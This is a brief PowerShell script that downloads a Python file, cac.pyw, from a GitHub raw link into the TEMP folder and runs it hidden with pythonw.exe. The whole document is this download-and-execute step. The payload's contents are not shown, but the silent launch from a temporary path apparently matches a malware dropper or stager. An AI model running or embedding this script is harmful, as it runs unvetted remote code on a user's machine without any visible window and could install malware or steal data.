# URL of the file to download
$url = "https://github.com/KevinDark5/data/raw/refs/heads/main/cac.pyw"

# Temporary file path to save the downloaded file
$tempPath = "$env:TEMP\cac.pyw"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $tempPath

# Execute the downloaded file
Start-Process -FilePath "pythonw.exe" -ArgumentList $tempPath
